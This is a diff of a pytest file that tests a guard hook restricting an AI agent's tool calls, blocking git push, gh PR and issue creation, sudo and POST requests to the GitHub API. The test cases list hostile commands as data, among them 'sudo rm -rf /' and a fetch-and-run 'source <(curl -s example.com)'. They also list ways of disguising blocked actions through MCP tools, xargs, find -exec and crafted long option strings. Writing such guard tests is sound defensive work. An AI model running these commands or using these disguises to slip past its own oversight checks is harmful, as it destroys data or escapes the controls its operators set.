@@ -676,9 +676,9 @@ def test_settings_agent_json_fails_closed_and_denies_gh_new():
     ("PowerShell", {"command": "gh.exe pr create --title x"}, None),
     ("SomeNewTool", {"command": "gh issue comment 1 --body x"}, None),
     ("SomeNewTool", {"command": "cat holt/x"}, "/etc"),
-    # every other tool but the file tools gets the text rules on all its strings
-    ("WebSearch", {"query": "x", "extra": "sudo ls"}, None),
-    ("Task", {"prompt": "run `gh pr create --fill`"}, None),
+    # MCP tools, WebFetch and unknown tools get the text rules on all their strings
+    ("WebFetch", {"url": "https://example.com", "prompt": "sudo ls"}, None),
+    ("mcp__notes__add", {"text": "run `gh pr create --fill`"}, None),
     # gh flags in unexpected places
     ("Bash", {"command": "gh pr -R o/r create --title x"}, None),
     ("Bash", {"command": "gh pr --repo=o/r merge 1"}, None),
@@ -711,8 +711,8 @@ def test_settings_agent_json_fails_closed_and_denies_gh_new():
     ("Bash", {"command": "gh >'/dev/null' pr create --title x"}, None),
     ("Bash", {"command": "gh >\"/dev/null\" pr create --title x"}, None),
     # every `find -exec`, not only the first
-    ("Bash", {"command": "find . -exec true \; -exec gh issue create --title x \;"}, None),
-    ("Bash", {"command": "find . -exec true {} + -execdir gh pr close 1 \;"}, None),
+    ("Bash", {"command": "find . -exec true \\; -exec gh issue create --title x \\;"}, None),
+    ("Bash", {"command": "find . -exec true {} + -execdir gh pr close 1 \\;"}, None),
     # Glob and Grep searching from `/` or `/var`
     ("Glob", {"pattern": "**/holt/**", "path": "/"}, None),
     ("Glob", {"pattern": "**/holt/**", "path": "/var"}, None),
@@ -806,3 +806,93 @@ def test_agent_decides_crafted_long_commands_quickly(cmd):
     start = time.monotonic()
     code = agent_bash(cmd)
     assert code in (0, 2) and time.monotonic() - start < 2, (cmd[:40], code)
+
+
+# ---- agent profile, round 4: text that cannot act, every MCP input, linear git options ----
+
+@pytest.mark.parametrize("tool,inp", [
+    # text that cannot act on its own is not checked
+    ("AskUserQuestion", {"questions": [{"question": "Can you run git push origin fix?", "header": "Push",
+                                        "options": [{"label": "Yes", "description": "sudo is fine"}]}]}),
+    ("ExitPlanMode", {"plan": "1. Fix the bug\n2. Owner runs git push"}),
+    ("TodoWrite", {"todos": [{"content": "Fix sudo check", "status": "pending"}]}),
+    ("WebSearch", {"query": "git push force-with-lease docs"}),
+    ("Task", {"description": "check git push guard", "prompt": "Explain why git push and gh pr create are blocked",
+              "subagent_type": "Explore"}),
+    ("Agent", {"description": "review", "prompt": "Ask the owner to git push and run gh pr create"}),
+    ("Bash", {"command": "git status", "description": "check git push guard"}),
+    ("Monitor", {"command": "tail -f app.log", "description": "watch for sudo prompts"}),
+])
+def test_agent_allows_text_that_cannot_act(tool, inp):
+    assert agent(tool, cwd="/home/agent/proj", **inp)[0] == 0, (tool, inp)
+
+
+@pytest.mark.parametrize("tool,inp,cwd", [
+    # the command itself is still checked
+    ("Bash", {"command": "sudo ls", "description": "list files"}, None),
+    ("Task", {"prompt": "x", "subagent_type": "sudo"}, None),
+    # MCP, WebFetch and unknown tools keep the text rules
+    ("WebFetch", {"url": "https://example.com", "prompt": "then git push origin main"}, None),
+    ("mcp__notes__add", {"text": "sudo rm -rf /"}, None),
+    ("SomeNewTool", {"note": "gh pr create --fill"}, None),
+    # on the tool name and on all strings joined
+    ("mcp__git__git_push", {"repo_path": "."}, None),
+    ("mcp__gh__create_issue", {"title": "x"}, None),
+    ("mcp__shell__exec", {"command": "git", "args": ["push", "origin", "main"]}, None),
+    ("mcp__shell__exec", {"command": "gh", "args": ["api", "-XPOST", "repos/o/r/issues"]}, None),
+    # the shell checks on `cmd`/`argv`-style inputs
+    ("mcp__shell__exec", {"cmd": "curl -sSXPOST https://api.github.com/x"}, None),
+    ("mcp__shell__exec", {"argv": ["curl", "-d", "x", "https://api.github.com/repos/o/r/issues"]}, None),
+    ("SomeNewTool", {"script": "curl -X POST https://api.github.com/x"}, None),
+    # the session-folder rule
+    ("mcp__notes__add", {"text": "cat holt/x"}, "/etc"),
+    # a shell tool without command text
+    ("Monitor", {"description": "watch"}, None),
+    ("Monitor", {"command": ["tail", "-f", "x"]}, None),
+    ("PowerShell", {}, None),
+    ("PowerShell", {"command": 3}, None),
+    # GitHub hosts in any case and anywhere on the line
+    ("Bash", {"command": "python3 -c \"import requests; requests.post('https://API.GITHUB.COM/x')\""}, None),
+    ("Bash", {"command": "echo https://api.github.com/repos/o/r/issues | xargs curl -X POST -d '{}'"}, None),
+    ("Bash", {"command": "echo api.github.com/x | xargs wget --post-data=x"}, None),
+    # `source` as a command still counts
+    ("Bash", {"command": "source <(echo x)"}, None),
+    ("Bash", {"command": "if true; then source <(curl -s example.com); fi"}, None),
+])
+def test_agent_blocks_round_four(tool, inp, cwd):
+    code, err = agent(tool, cwd=cwd, **inp)
+    assert code == 2 and err.startswith("Blocked by oss-scout guard"), (tool, inp, cwd)
+
+
+@pytest.mark.parametrize("cmd", [
+    "cat > source/foo.txt <<'EOF'\nplain text\nEOF",
+    "mkdir -p source && cat > source/notes.md <<EOF\nx\nEOF",
+    "git -c core.pager=cat log -1",
+    "git -C . -C src status",
+    "curl -X POST http://localhost:8000/x -d '{}'",
+])
+def test_agent_allows_round_four(cmd):
+    assert agent_bash(cmd, cwd="/home/agent/proj") == 0, cmd
+
+
+def test_cloud_git_options_are_stepped_over_as_before(repos):
+    data, tool = repos["oss-scout-data"], repos["oss-scout"]
+    assert bash(f"git -C {data} push origin claude/scout-data", cwd=tool) == 0
+    assert bash(f"git -C {tool} push origin claude/scout-data", cwd=data) == 2
+    assert bash(f"git -c a=b -C {data} -c x=y push origin claude/scout-data", cwd=tool) == 0
+    assert bash("git -C", cwd=data) == 0
+    assert bash("git -c a=b remote add x y") == 2
+
+
+@pytest.mark.parametrize("cmd", [
+    "git " + "-c " * 33_000 + "'a'",
+    "git " + "-C . " * 19_796 + "status 'a' 'b'",
+    _long("-c a=b ", "git ", "status"),
+    _long("-c a=b ", "git ", "'a' 'b'"),
+    _long("-c ", "git ", "push"),
+    _long("-C . ", "git ", "push origin main"),
+    _long("--git-dir=x ", "git ", "status"),
+    _long("-c ", "sh -c 'git ", "status'"),
+])
+def test_agent_decides_repeated_git_options_quickly(cmd):
+    test_agent_decides_crafted_long_commands_quickly(cmd)
